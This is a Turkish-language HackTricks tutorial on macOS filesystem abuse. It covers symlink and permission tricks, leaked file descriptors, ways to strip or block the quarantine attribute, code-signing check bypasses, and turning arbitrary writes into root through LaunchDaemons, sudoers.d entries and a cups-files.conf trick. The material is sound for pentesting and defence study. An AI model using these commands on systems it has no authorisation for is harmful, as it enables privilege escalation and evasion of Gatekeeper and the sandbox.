# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX izin kombinasyonları

Bir **directory** için üç izin biti, normal bir dosyada ifade ettiklerinden farklı bir anlama gelir. `chmod(1)`, bir directory'ye uygulandığında execute bitini "**search**" olarak adlandırır:<sup>[[2]](#references)</sup>

> `0100` Dosyalar için owner tarafından çalıştırmaya izin verir. Directory'ler için owner'ın directory içinde **search** yapmasına izin verir.

- **read** - directory girişlerini (isimleri) **enumerate** edebilirsiniz.
- **write** - directory içinde girişler **oluşturabilir, yeniden adlandırabilir ve silebilirsiniz**. Bunun dosyanın değil, *içeren* directory'nin bir özelliği olduğunu unutmayın: Parent directory'ye write izniniz olduğu sürece, okuyamadığınız veya yazamadığınız bir dosyayı silebilirsiniz.
- Bir **subdirectory**'yi silmek için boş olması gerekir; bu da içindeki her şeyi kaldırmak için yeterli haklara sahip olmayı gerektirir.
- Directory'de **sticky bit** (`S_ISVTX`, `/tmp` gibi) varsa bu işlem kısıtlanır — POSIX'e göre bir process, yalnızca dosyanın sahibi, directory'nin sahibi veya uygun yetkilere sahip olması durumunda bu directory içindeki dosyaları silebilir ya da yeniden adlandırabilir.<sup>[[1]](#references)</sup>
- **execute / search** - directory'yi **traverse** etmenize izin verilir. Pathname çözümleme, her bir bileşeni "kendinden önceki tarafından belirtilen directory içinde" bulur; bu nedenle path prefix'in herhangi bir bileşeninde search haklarını **kaybetmek**, leaf file'ın kendisi world-readable olsa bile altındaki her şeyi path üzerinden erişilemez hale getirir.<sup>[[1]](#references)</sup>

### Dangerous Combinations

**root tarafından sahip olunan bir file/folder'ın üzerine yazmak** için:

- Path içindeki bir parent **directory owner** user'dır
- Path içindeki bir parent **directory owner**, **write access** sahibi bir **users group**'udur
- Bir users **group**, **file** üzerinde **write** access'e sahiptir

Önceki kombinasyonlardan herhangi birinde attacker, ayrıcalıklı bir arbitrary write elde etmek için beklenen path'e bir **sym/hard link** **inject** edebilir.

### Folder root R+X special case

Bu durum doğrudan yukarıdaki pathname-resolution kuralından kaynaklanır. Bir **directory** yalnızca root'a R+X veriyorsa, içindeki dosyalar herkes için *path üzerinden* erişilemez hale gelir — ancak **dosyaların kendi permission bitleri yine de permissive olabilir**. Engeli oluşturan tek şey directory'dir.

Dolayısıyla dosyayı bu directory dışına çıkarmanızı sağlayan herhangi bir primitive — attacker tarafından seçilen bir path'i sizin traverse edebildiğiniz bir konuma **move/rename/copy** eden ayrıcalıklı bir process — dosyanın kendi mode'unu aşmaya hiç gerek kalmadan arbitrary read'e dönüşür:
```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```
Ayrıcalıklı dosya taşıyıcılarını (installer'lar, log rotator'ları, crash/diagnostic collector'lar, backup ve "export" özellikleri) arayın; bunlar daha düşük ayrıcalıklı bir kullanıcıdan kaynak yolu kabul eder.

## Symbolic Link / Hard Link

### İzin verilen dosya/klasör

Ayrıcalıklı bir işlem, **daha düşük ayrıcalıklı bir kullanıcı tarafından kontrol edilebilecek** veya daha düşük ayrıcalıklı bir kullanıcı tarafından **önceden oluşturulmuş olabilecek** bir **dosyaya** veri yazıyorsa. Kullanıcı, Symbolic veya Hard link aracılığıyla **dosyayı başka bir dosyaya yönlendirebilir** ve ayrıcalıklı işlem bu dosyaya yazacaktır.

Bir saldırganın **ayrıcalıkları yükseltmek için rastgele bir yazma işlemini kötüye kullanabileceği** diğer bölümleri kontrol edin.

### `O_NOFOLLOW` ile açma

[`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html) başına: *"`O_NOFOLLOW` maskede kullanılırsa ve `open()`'a geçirilen hedef dosya bir symbolic link ise `open()` başarısız olur."* Yalnızca **son** bileşen kontrol edilir — tüm **ara** bileşenler yine çözümlenir ve takip edilir. Bu nedenle bir geliştirici yazma işlemini `O_NOFOLLOW` ile "korumuş" olsa bile saldırgan, hedef yolun herhangi bir **üst dizinine** bir symlink yerleştirerek saldırabilir.<sup>[[3]](#references)</sup>

Aynı man sayfası, bu açığı gerçekten kapatan flag'leri belgeler:<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *"`open()`'a geçirilen yolun ... herhangi bir bileşeni symbolic link ise `open()` başarısız olur."*
- **`O_RESOLVE_BENEATH`** — *"belirtilen yol çözümlemesi fd ile ilişkilendirilmiş dizinin dışına çıkarsa `openat()` başarısız olur."*

Bunun dışında, önceden doğruladığınız bir dizin FD'sine göre `openat()` kullanmak veya `realpath()` + yeniden doğrulama yapmak, yolun ortasındaki symlink değişimlerini durdurmanın kalan yollarıdır.

## .fileloc

**`.fileloc`** uzantılı dosyalar diğer uygulamalara veya binary'lere işaret edebilir; böylece açıldıklarında uygulama/binary çalıştırılır.\
Örnek:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## File Descriptors

### Leak FD (no `O_CLOEXEC`)

Bir `open` çağrısında `O_CLOEXEC` flag'i yoksa file descriptor child process tarafından devralınır. Bu nedenle privileged bir process privileged bir file açar ve attacker tarafından kontrol edilen bir process çalıştırırsa attacker, **privileged file üzerindeki FD'yi devralır**.

Bunun canonical örneği **OS X 10.10'daki `DYLD_PRINT_TO_FILE` LPE'sidir** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>

- `dyld`, bu particular variable `processDyldEnvironmentVariable()` dışında parse edildiği için **restricted (suid root) binary'lerde** bile `DYLD_PRINT_TO_FILE=/path` değerini dikkate alıyordu.
- `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)` çağrısını yapıyordu; böylece **herhangi bir path'te root-owned bir file oluşturuyordu**.
- FD **asla kapatılmıyor ve close-on-exec flag'ine sahip değildi**; bu nedenle suid binary'nin her child process'i **root-owned bir file'a writable FD** devralıyordu.
- Örneğin `DYLD_PRINT_TO_FILE=/etc/target suid_binary` çalıştırıp ardından child process'te devralınan FD number'ını okumak, root-owned file'lara arbitrary write yapılmasını sağlıyordu; `fcntl(fd, F_SETFL, 0)` ile `O_APPEND` bile temizlenerek append yerine overwrite yapılabiliyordu.

Aynı durum, privileged bir process `exec` ile kontrol ettiğiniz bir şeyi çalıştırmadan **önce** bir file açtığında da ortaya çıkar (helper tools, `$EDITOR` üzerinden çağrılan `crontab`-style editors, env-var path'inden açılan log/debug files...). Devraldığınız FD'leri şu şekilde enumerate edin:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
`2` üzerindeki ve kendiniz açamadığınız bir dosyaya işaret eden her şey, bir arbitrary-write (veya arbitrary-read) primitive'idir.

## quarantine xattrs tricks'ten kaçının

### Kaldırın
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Bir dosya/klasör bu immutable özniteliğine sahipse, üzerine xattr eklemek mümkün olmaz.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### xattr desteği olmayan dosya sistemleri

macOS'un mount edebildiği her dosya sistemi **extended attributes**'ı yerel olarak depolamaz. HFS+ ve APFS bunu destekler; **FAT32, exFAT ve (çoğu) NFS mount'ı desteklemez** — macOS bunları `._<filename>` adında bir **AppleDouble** yan dosyası yazarak emüle eder ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[[5]](#references)</sup>

Bu, quarantine açısından önemlidir; çünkü xattr yalnızca aynı volume üzerinden gerçekten yazılabiliyor **ve tekrar okunabiliyorsa** hayatta kalır:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
Birimin daha sonra `._` eşlikçi dosyasını yok sayan bir yol üzerinden okunması (veya eşlikçi dosyanın kaldırılması/silinmesi) durumunda dosya **quarantine flag olmadan** gelir — ve quarantine uygulanmamış bir `.app`, [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute) bölümünde ele alındığı üzere App Sandbox'tan kaçmak için yeterlidir.

### writeextattr ACL

Bu ACL, dosyaya `xattrs` eklenmesini engeller.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** file format, bir dosyayı ACE'leriyle birlikte kopyalar.

[**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) içinde, **`com.apple.acl.text`** adlı xattr içinde depolanan ACL metin gösteriminin sıkıştırılmış dosyada ACL olarak ayarlandığını görmek mümkündür. Bu nedenle, bir uygulamayı, diğer xattr'ların dosyaya yazılmasını engelleyen bir ACL ile **AppleDouble** file format kullanarak bir zip file içine sıkıştırırsanız... quarantine xattr uygulamaya ayarlanmaz:

Daha fazla bilgi için [**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) inceleyin.<sup>[[6]](#references)</sup>

Bunu yeniden oluşturmak için öncelikle doğru acl string'i elde etmemiz gerekir:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Not: Bu çalışsa bile sandbox daha önce quarantine xattr'ını yazar)

Gerçekten gerekli değil ama her ihtimale karşı burada bırakıyorum:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Signature checks bypass

### Platform binaries checks bypass

Bazı security checks, örneğin bir XPC service'e bağlanmaya izin vermek için binary'nin bir **platform binary** olup olmadığını kontrol eder. Ancak https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ adresindeki bypass'ta gösterildiği üzere, bir platform binary (örneğin /bin/ls) edinip exploit'i `DYLD_INSERT_LIBRARIES` environment variable'ı aracılığıyla dyld kullanarak inject ederek bu check'i bypass etmek mümkündür.<sup>[[7]](#references)</sup>

### `CS_REQUIRE_LV` ve `CS_FORCED_LV` flag'lerini bypass etme

Çalışan bir binary'nin, aşağıdaki gibi bir code ile kendi flag'lerini değiştirerek check'leri bypass etmesi mümkündür:<sup>[[7]](#references)</sup>
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Code Signatures Bypass

Bundle'lar, **bundle** içindeki her bir **file**'ın **hash** değerini içeren **`_CodeSignature/CodeResources`** dosyasını barındırır. CodeResources'ın hash değerinin de **executable** içine gömülü olduğunu unutmayın; dolayısıyla bununla da oynayamayız.

Ancak bazı file'ların signature değeri kontrol edilmez. Bunlar plist içinde `omit` anahtarına sahip olan file'lardır; örneğin:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Bir kaynağın signature değerini CLI üzerinden hesaplamak mümkündür:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## DMG'leri mount etme

Bir kullanıcı, özel olarak oluşturulmuş bir DMG'yi mevcut bazı klasörlerin üzerine bile mount edebilir. Özel içerik içeren bir DMG paketi şu şekilde oluşturulabilir:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Genellikle macOS, `/usr/libexec/diskarbitrationd` tarafından sağlanan `com.apple.DiskArbitrarion.diskarbitrariond` Mach service ile iletişim kurarak diskleri mount eder. LaunchDaemons plist dosyasına `-d` parametresi eklenip yeniden başlatılırsa, logları `/var/log/diskarbitrationd.log` dosyasına kaydeder.\
Ancak `com.apple.driver.DiskImages` kext ile doğrudan iletişim kurmak için `hdik` ve `hdiutil` gibi araçları kullanmak mümkündür.

## Keyfi Yazmalar

### Periodic sh script'leri

Script'iniz **shell script** olarak yorumlanabiliyorsa, her gün tetiklenecek olan **`/etc/periodic/daily/999.local`** shell script'inin üzerine yazabilirsiniz.

Bu script'in çalıştırılmasını şu komutla **taklit** edebilirsiniz: **`sudo periodic daily`**

### Daemons

**`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** gibi, keyfi bir script çalıştıran plist içeren keyfi bir **LaunchDaemon** yazın:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Sadece root olarak çalıştırmak istediğiniz **komutlarla** `/Applications/Scripts/privesc.sh` script'ini oluşturun.

### Sudoers Dosyası

**Keyfi yazma yetkiniz** varsa, kendinize **sudo** ayrıcalıkları tanıyan bir dosyayı **`/etc/sudoers.d/`** klasörü içinde oluşturabilirsiniz.

### PATH Dosyaları

**`/etc/paths`** dosyası, PATH env değişkenini oluşturan ana konumlardan biridir. Üzerine yazmak için root olmanız gerekir; ancak **privileged process** tam yol belirtmeden bir **komut** çalıştırıyorsa, bu dosyayı değiştirerek komutu **hijack** edebilirsiniz.

Ayrıca, PATH env değişkenine yeni klasörler yüklemek için **`/etc/paths.d`** içinde dosyalar yazabilirsiniz.

### cups-files.conf

Bu teknik [this writeup](https://www.kandji.io/blog/macos-audit-story-part1) içinde kullanılmıştır.<sup>[[8]](#references)</sup>

Aşağıdaki içeriğe sahip `/etc/cups/cups-files.conf` dosyasını oluşturun:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Bu, `/etc/sudoers.d/lpe` dosyasını 777 izinleriyle oluşturur. Sondaki fazladan içerik, error log oluşturulmasını tetiklemek içindir.

Ardından, `%staff ALL=(ALL) NOPASSWD:ALL` gibi privilege escalation için gereken yapılandırmayı `/etc/sudoers.d/lpe` içine yazın.

Sonra, `LogFilePerm 700` belirterek `/etc/cups/cups-files.conf` dosyasını tekrar değiştirin; böylece yeni sudoers dosyası `cupsctl` çağrıldığında geçerli hale gelir.

### Sandbox Escape

FS arbitrary write ile macOS sandbox'ından escape etmek mümkündür. Bazı örnekler için [macOS Auto Start](../../../../macos-auto-start-locations.md) sayfasına bakın; ancak yaygın bir yöntem, başlangıçta bir command çalıştıran Terminal preferences dosyasını `~/Library/Preferences/com.apple.Terminal.plist` konumuna yazmak ve bunu `open` kullanarak çağırmaktır.

## Diğer kullanıcılar olarak writable files oluşturma

Çok yaygın bir privesc primitive, **privileged bir process'in sizin için kontrol ettiğiniz bir directory içinde file oluşturmasını** sağlamak ve ardından bu file üzerinde **write access**'i korumaktır. İki bileşen gereklidir:

1. Sahip olduğunuz bir directory (veya **inheritable ACL** ayarlayabildiğiniz bir directory); böylece içinde oluşturulan her şey permissions'larınızı devralır.
2. Bir file'ın **nerede** oluşturulacağını belirtebileceğiniz privileged/`suid` bir process — genellikle bir debug/logging environment variable, config file veya helper'ın XPC API'si aracılığıyla.

**Inheritable ACL** kısmı, oluşturulan file başka bir user'a ait olsa bile sizin tarafınızdan writable olmasını sağlar. `file_inherit` / `directory_inherit` inheritance flag'leri [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html) içinde belgelenmiştir:<sup>[[2]](#references)</sup>
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Artık ayrıcalıklı bir process’in `$DIRNAME` içinde oluşturduğu tüm dosyalar **sizin tarafınızdan yazılabilir**. Bu dizin daha sonra **root olarak çalıştırılan** bir konumsa (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, bir LaunchDaemon dizini...), bu doğrudan root escalation sağlar. Dosyayı elde ettikten sonra ne yazmanız gerektiği için yukarıdaki [Sudoers File](#sudoers-file) ve [cups-files.conf](#cups-filesconf) bölümlerine bakın.

"env variable bir root process’inin dosya oluşturmasını sağlar ve FD size leak olur" zincirinin eksiksiz bir örneği için yukarıdaki [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) bölümüne bakın.

## POSIX Shared Memory

**POSIX shared memory**, POSIX uyumlu işletim sistemlerindeki process’lerin ortak bir memory alanına erişmesini sağlayarak, diğer process’ler arası iletişim yöntemlerine kıyasla daha hızlı iletişim kurulmasını sağlar. Bu işlem, `shm_open()` ile bir shared memory object oluşturmayı veya açmayı, boyutunu `ftruncate()` ile ayarlamayı ve `mmap()` kullanarak process’in address space’ine map etmeyi içerir. Process’ler daha sonra bu memory alanını doğrudan okuyabilir ve buraya yazabilir. Eşzamanlı erişimi yönetmek ve data corruption’ı önlemek için genellikle mutex veya semaphore gibi synchronization mechanism’leri kullanılır. Son olarak process’ler `munmap()` ve `close()` ile shared memory’nin map’ini kaldırır ve bağlantısını kapatır; isteğe bağlı olarak memory object’i `shm_unlink()` ile kaldırır. Bu sistem, birden fazla process’in shared data’ya hızlı bir şekilde erişmesi gereken ortamlarda verimli ve hızlı IPC için özellikle etkilidir.

<details>

<summary>Producer Code Example</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Tüketici Kod Örneği</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors**, kullanıcı uygulamalarında güvenliği ve güvenilirliği artırmak amacıyla macOS'ta sunulan bir güvenlik özelliğidir. Bu guarded descriptor'lar, dosya descriptor'larıyla kernel tarafından uygulanan belirli kısıtlamaları veya "guard"ları ilişkilendirmek için bir yöntem sağlar.

Bu özellik, **yetkisiz dosya erişimi** veya **race condition** gibi belirli güvenlik açıkları sınıflarını önlemek için özellikle kullanışlıdır. Bu açıklar, örneğin bir thread'in bir dosya açıklamasına erişerek **başka bir güvenlik açığı bulunan thread'e erişim sağlaması** veya bir file descriptor'ın **güvenlik açığı bulunan bir child process** tarafından devralınması durumunda ortaya çıkar. Bu işlevle ilişkili bazı fonksiyonlar şunlardır:

- `guarded_open_np`: Bir FD'yi guard ile açar
- `guarded_close_np`: Kapatır
- `change_fdguard_np`: Bir descriptor üzerindeki guard flag'lerini değiştirir (guard korumasını kaldırmak dahil)

## References

- [1] [POSIX.1-2024 — Base Definitions, Ch. 4 (File Access Permissions, Directory Protection, Pathname Resolution)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (close-on-exec olmadan leak edilen FD)
- [5] [The Eclectic Light Company - Which file systems and cloud services preserve extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft - Gatekeeper's Achilles heel: unearthing a macOS vulnerability](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) - A New Era of macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Uncovering Apple Vulnerabilities: The diskarbitrationd and storagekitd Audit Story Part 1](https://www.kandji.io/blog/macos-audit-story-part1)

{{#include ../../../../banners/hacktricks-training.md}}
